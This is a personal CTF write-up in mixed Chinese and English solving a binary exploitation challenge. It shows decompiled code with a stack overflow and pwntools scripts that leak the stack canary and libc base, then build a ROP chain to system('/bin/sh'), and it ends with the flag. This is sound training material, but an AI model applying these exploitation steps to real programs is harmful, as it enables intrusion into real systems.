# 1.0 Challenge

1. where is the leaking point?
2. how to find the canary?
3. canary rec, why need + b'\0'
4. leak stack find libc base 
5. how to build ROP 

# 2.0 Analysis

source code 
parsecmd 
```cpp
__int64 __fastcall parsecmd(const char *a1, __int64 a2)
{
  pthread_t *v2; // rax
  char *endptr[3]; // [rsp+18h] [rbp-18h] BYREF

  endptr[2] = __readfsqword(0x28u);
  endptr[1] = 0;
  endptr[0] = 0;
  pa = 0;
  unk_4040D0 = 0;
  if ( !strncmp(a1, "CHUNKS ", 7u) )
  {
    nthread = strtoul(a1 + 7, 0, 10);
    if ( nthread > 0xAu )
      errx(-1, "bad number of threads");
    printf("set nthread to %u\n", nthread);
  }
  else if ( !strncmp(a1, "CHUNK ", 5u) )
  {
    if ( nthread )
    {
      LODWORD(pa) = strtoul(a1 + 6, endptr, 10);
      DWORD1(pa) = strtoul(endptr[0] + 1, endptr, 10);
      *(&pa + 1) = endptr[0] + 1;
      unk_4040D0 = a2 - (endptr[0] + 1 - a1);
      v2 = curthread;
      curthread += 8LL;
      pthread_create(v2, 0, print, &pa);
      --nthread;
    }
    else
    {
      puts("no threads remaining");
    }
  }
  else if ( !strncmp(a1, "CHONK ", 5u) )
  {
    puts(chonk);
  }
  else
  {
    puts("unknown command");
  }
  return 0;
}
```
print function
```cpp
void *__fastcall print(void *a1)
{
  int v3; // [rsp+10h] [rbp-60h]
  unsigned int seconds; // [rsp+14h] [rbp-5Ch]
  _QWORD dest[10]; // [rsp+20h] [rbp-50h] BYREF

  dest[9] = __readfsqword(0x28u);
  memset(dest, 0, 64);
  v3 = *(a1 + 1);
  seconds = *a1;
  memcpy(dest, *(a1 + 1), *(a1 + 2));
  while ( v3-- )
  {
    puts(dest);
    sleep(seconds);
  }
  return 0;
}
```
USAGE 

![[Pasted image 20250716220629.png]]
first need to 
CHUNKS `NUM OF THREAD`
CHUNK `TIMESLEEP` `REPEAT` `CHAR`

the customize print so I assume need to do something from here 
# 3.0 Solution
## 3.1 FIND THE LEAKING POINT 
PRINT 这边是最后把 a1 给到 dest
so 这个 dest 是 收到 rbp - 0x50
![[Pasted image 20250716221045.png]]
而且没有 \x00? 不知道 有没有关系
会把 dest 压满 然后带出后面的 value 

## 3.2 HOW TO FIND THE CANARY
因为dest 是 0x50 所以 canary 通常会在 return 前一个 so 0x50 - 1 = 0x49
```
void *__fastcall print(void *a1)
{
  int v3;                   // [rsp+10h]  → rbp - 0x60
  unsigned int seconds;     // [rsp+14h]  → rbp - 0x5C
  _QWORD dest[10];          // [rsp+20h]  → rbp - 0x50
                            //            → rbp - 0x50 to rbp - 0x08
  dest[9] = __readfsqword(0x28u); // writes canary at rbp - 0x08
  ...
}
```
这边我直接用别人的leaking 一定要补齐 8 个 
manual
一开始 是 rc(7) 要加 b'\0'  + rc(7) 才能转 u64
```python
# leak
# must + b'\0'
canary = u64(b'\0'+rc(7))
print("canary:",hex(canary))
leak_stack = u64(b'\0'*2+ru7f())
print("leak_stack",hex(leak_stack))
libc_base = leak_stack + 0x200090
print("libc base",hex(libc_base))
dbg()
```
后面的 leak stack 是直接拿 罢了 然后对着 vmmap diff
记得要补齐 不确定的话可以len(rl()) 看length 

auto 一点
```python
# must + b'\0'
leak=b'\x00'+rl().strip()
warn(f"Thread leak: {leak}")
canary = u64(leak[:8])
print("canary:",hex(canary))
leak_stack = u64(leak[8:]+b'\x00'*(8-len(leak[8:])))
print("leak_stack",hex(leak_stack))
libc_base = leak_stack + 0x200090
print("libc base",hex(libc_base))
libc.address=libc_base
# dbg()
```

## 3.3 HOW TO BUILD ROP

下面是auto way 去找 也可以ropgadget 
主要都有了
```python
libc.address=libc_base
# dbg()

# ROP
rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']
```

attack payload 
就是 offset + canary + 随便 8 个 + ret + pop_rdi + bin_sh + system
可是我看到有人
就是 offset + canary + 随便 8 个 + pop_rdi + bin_sh + ret + system 也可以 
还有
我看到没有ret 也可以 ？？？？就以防万一 alignment 问题
```
# attack payload 
offset = 0x48
payload = b'CHUNK 1 1 ' 
payload += b'a' * offset 
payload += p64(canary)
payload += b'b' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```
# 4.0 FLAG 
L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}

# 5.0 FINAL SCRIPT 
![[exploit3.py]]